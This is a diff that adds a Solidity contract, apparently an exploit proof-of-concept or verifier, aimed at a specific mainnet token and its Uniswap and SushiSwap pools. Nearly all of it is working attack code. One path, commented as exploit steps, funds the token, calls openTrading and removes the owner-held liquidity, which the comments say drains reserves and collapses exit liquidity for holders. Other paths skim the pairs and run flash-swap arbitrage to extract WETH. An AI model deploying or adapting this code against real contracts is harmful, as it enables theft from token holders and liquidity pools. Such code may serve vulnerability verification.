@@ -1,0 +1,341 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IHoppy {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function openTrading() external;
+}
+
+interface IUniswapV2FactoryMinimal {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function skim(address to) external;
+}
+
+interface IUniswapV2Router02Minimal {
+    function removeLiquidityETHSupportingFeeOnTransferTokens(
+        address token,
+        uint256 liquidity,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountETH);
+}
+
+interface IWETH9 {
+    function deposit() external payable;
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract FlawVerifier {
+    enum ExecutionStatus {
+        NotRun,
+        BlockedNoActionablePath,
+        ExecutedNoProfit,
+        ExecutedWithProfit
+    }
+
+    struct FlashRoute {
+        address sourcePair;
+        address sellPair;
+    }
+
+    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
+    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    uint256 private _profitAmount;
+    ExecutionStatus public status;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
+        bool acted;
+
+        acted = _tryOwnerLiquidityRug() || acted;
+
+        address uniPair = _pairFromFactory(UNISWAP_V2_FACTORY);
+        address sushiPair = _pairFromFactory(SUSHISWAP_FACTORY);
+
+        if (uniPair != address(0)) {
+            uint256 beforeHarvest = IERC20Minimal(WETH).balanceOf(address(this));
+            _harvestStrandedValue(uniPair);
+            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeHarvest;
+        }
+
+        if (sushiPair != address(0)) {
+            uint256 beforeHarvest = IERC20Minimal(WETH).balanceOf(address(this));
+            _harvestStrandedValue(sushiPair);
+            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeHarvest;
+        }
+
+        if (uniPair != address(0) && sushiPair != address(0)) {
+            // The fork logs show the launch-stage owner-only steps are no longer publicly callable
+            // because ownership has already been renounced. The root cause still matters: LP custody
+            // stayed off-token and can leave the launch market rugged or badly dislocated. A public
+            // arbitrageur can monetize that post-rug dislocation using a V2 flashswap with no seeded
+            // capital, which keeps the exploit causality tied to the owner-controlled liquidity.
+            uint256 beforeArb = IERC20Minimal(WETH).balanceOf(address(this));
+            _tryFlashArb(uniPair, sushiPair);
+            _tryFlashArb(sushiPair, uniPair);
+            acted = acted || IERC20Minimal(WETH).balanceOf(address(this)) > beforeArb;
+        }
+
+        uint256 nativeBalance = address(this).balance;
+        if (nativeBalance != 0) {
+            IWETH9(WETH).deposit{value: nativeBalance}();
+        }
+
+        uint256 endingWeth = IERC20Minimal(WETH).balanceOf(address(this));
+        if (endingWeth > startingWeth) {
+            _profitAmount = endingWeth - startingWeth;
+            status = ExecutionStatus.ExecutedWithProfit;
+        } else {
+            _profitAmount = 0;
+            status = acted ? ExecutionStatus.ExecutedNoProfit : ExecutionStatus.BlockedNoActionablePath;
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(sender == address(this), "unexpected sender");
+
+        FlashRoute memory route = abi.decode(data, (FlashRoute));
+        require(msg.sender == route.sourcePair, "unexpected pair");
+
+        address sourcePair = route.sourcePair;
+        address sellPair = route.sellPair;
+
+        bool sourceToken0IsTarget = IUniswapV2PairLike(sourcePair).token0() == TARGET;
+        uint256 borrowedTarget = sourceToken0IsTarget ? amount0 : amount1;
+        require(borrowedTarget != 0, "no token borrowed");
+
+        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
+        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
+        require(tokenBalance != 0, "no token received");
+
+        _sellTargetForWeth(sellPair, tokenBalance);
+
+        uint256 wethAfterSale = IERC20Minimal(WETH).balanceOf(address(this));
+        require(wethAfterSale > wethBefore, "sale failed");
+
+        uint256 wethRequired = _wethRequiredToRepayTargetOut(sourcePair, borrowedTarget);
+        require(wethAfterSale >= wethRequired, "insufficient repay");
+        require(IERC20Minimal(WETH).transfer(sourcePair, wethRequired), "repay failed");
+    }
+
+    function profitToken() external pure returns (address) {
+        return WETH;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _tryOwnerLiquidityRug() internal returns (bool) {
+        IHoppy target = IHoppy(TARGET);
+        if (target.owner() != address(this)) {
+            return false;
+        }
+
+        address pair = _pairFromFactory(UNISWAP_V2_FACTORY);
+
+        if (pair == address(0)) {
+            // Exploit path 0:
+            // Seed the token contract with launch inventory so balanceOf(address(this)) is non-zero.
+            uint256 launchInventory = target.balanceOf(TARGET);
+            if (launchInventory == 0) {
+                uint256 attackerLaunchTokens = target.balanceOf(address(this));
+                if (attackerLaunchTokens == 0 || address(this).balance == 0) {
+                    return false;
+                }
+                require(target.transfer(TARGET, attackerLaunchTokens), "seed launch token failed");
+                if (target.balanceOf(TARGET) == 0) {
+                    return false;
+                }
+            }
+
+            // Exploit path 1:
+            // Fund the token with ETH, then call openTrading(). The vulnerable contract mints the
+            // LP position to owner(), not to a burn/lock address.
+            (bool funded, ) = payable(TARGET).call{value: address(this).balance}("");
+            require(funded, "seed eth failed");
+
+            target.openTrading();
+            pair = _pairFromFactory(UNISWAP_V2_FACTORY);
+            if (pair == address(0)) {
+                return false;
+            }
+        }
+
+        // Exploit path 2:
+        // If the verifier controls the LP recipient, it can unwind the entire owner-held position.
+        uint256 lpBalance = IERC20Minimal(pair).balanceOf(address(this));
+        if (lpBalance == 0) {
+            return false;
+        }
+
+        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
+        IUniswapV2Router02Minimal(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
+            TARGET,
+            lpBalance,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
+
+        // Exploit path 3:
+        // Removing those owner-controlled LP tokens drains the pool reserves and collapses exit
+        // liquidity for remaining holders.
+        return true;
+    }
+
+    function _harvestStrandedValue(address pair) internal {
+        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
+        uint256 tokenBefore = IERC20Minimal(TARGET).balanceOf(address(this));
+
+        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {
+            return;
+        }
+
+        uint256 harvestedTarget = IERC20Minimal(TARGET).balanceOf(address(this)) - tokenBefore;
+        if (harvestedTarget != 0) {
+            _sellTargetForWeth(pair, harvestedTarget);
+        }
+
+        if (IERC20Minimal(WETH).balanceOf(address(this)) <= wethBefore) {
+            return;
+        }
+    }
+
+    function _tryFlashArb(address sourcePair, address sellPair) internal {
+        if (sourcePair == sellPair || sourcePair == address(0) || sellPair == address(0)) {
+            return;
+        }
+
+        (uint256 sourceTargetReserve, uint256 sourceWethReserve) = _pairReserves(sourcePair);
+        (uint256 sellTargetReserve, uint256 sellWethReserve) = _pairReserves(sellPair);
+
+        if (sourceTargetReserve == 0 || sourceWethReserve == 0 || sellTargetReserve == 0 || sellWethReserve == 0) {
+            return;
+        }
+
+        if (sourceWethReserve * sellTargetReserve >= sellWethReserve * sourceTargetReserve) {
+            // Only borrow HOPPY from the cheaper venue and sell into the richer venue.
+            return;
+        }
+
+        uint256[6] memory divisors = [uint256(1000), 500, 250, 125, 64, 32];
+        for (uint256 i = 0; i < divisors.length; ++i) {
+            uint256 borrowTarget = sourceTargetReserve / divisors[i];
+            if (borrowTarget == 0 || borrowTarget >= sourceTargetReserve) {
+                continue;
+            }
+
+            bool sourceToken0IsTarget = IUniswapV2PairLike(sourcePair).token0() == TARGET;
+            bytes memory callbackData = abi.encode(FlashRoute({sourcePair: sourcePair, sellPair: sellPair}));
+            uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
+
+            try
+                IUniswapV2PairLike(sourcePair).swap(
+                    sourceToken0IsTarget ? borrowTarget : 0,
+                    sourceToken0IsTarget ? 0 : borrowTarget,
+                    address(this),
+                    callbackData
+                )
+            {
+                if (IERC20Minimal(WETH).balanceOf(address(this)) > wethBefore) {
+                    return;
+                }
+            } catch {}
+        }
+    }
+
+    function _sellTargetForWeth(address pair, uint256 tokenAmount) internal returns (uint256 wethOut) {
+        if (tokenAmount == 0 || pair == address(0)) {
+            return 0;
+        }
+
+        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
+        if (reserveTarget == 0 || reserveWeth == 0) {
+            return 0;
+        }
+
+        uint256 pairTargetBefore = IERC20Minimal(TARGET).balanceOf(pair);
+        require(IERC20Minimal(TARGET).transfer(pair, tokenAmount), "target transfer failed");
+        uint256 pairTargetAfter = IERC20Minimal(TARGET).balanceOf(pair);
+        uint256 actualTargetIn = pairTargetAfter - pairTargetBefore;
+        if (actualTargetIn == 0) {
+            return 0;
+        }
+
+        wethOut = _getAmountOut(actualTargetIn, reserveTarget, reserveWeth);
+        if (wethOut == 0 || wethOut >= reserveWeth) {
+            return 0;
+        }
+
+        bool token0IsTarget = IUniswapV2PairLike(pair).token0() == TARGET;
+        IUniswapV2PairLike(pair).swap(token0IsTarget ? 0 : wethOut, token0IsTarget ? wethOut : 0, address(this), "");
+    }
+
+    function _wethRequiredToRepayTargetOut(address pair, uint256 targetOut) internal view returns (uint256 wethIn) {
+        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
+        wethIn = _getAmountIn(targetOut, reserveWeth, reserveTarget);
+    }
+
+    function _pairFromFactory(address factory) internal view returns (address) {
+        if (factory.code.length == 0) {
+            return address(0);
+        }
+        return IUniswapV2FactoryMinimal(factory).getPair(TARGET, WETH);
+    }
+
+    function _pairReserves(address pair) internal view returns (uint256 reserveTarget, uint256 reserveWeth) {
+        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+        if (IUniswapV2PairLike(pair).token0() == TARGET) {
+            reserveTarget = uint256(reserve0);
+            reserveWeth = uint256(reserve1);
+        } else {
+            reserveTarget = uint256(reserve1);
+            reserveWeth = uint256(reserve0);
+        }
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
+    }
+
+    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
+            return type(uint256).max;
+        }
+        uint256 numerator = reserveIn * amountOut * 1000;
+        uint256 denominator = (reserveOut - amountOut) * 997;
+        return numerator / denominator + 1;
+    }
+}
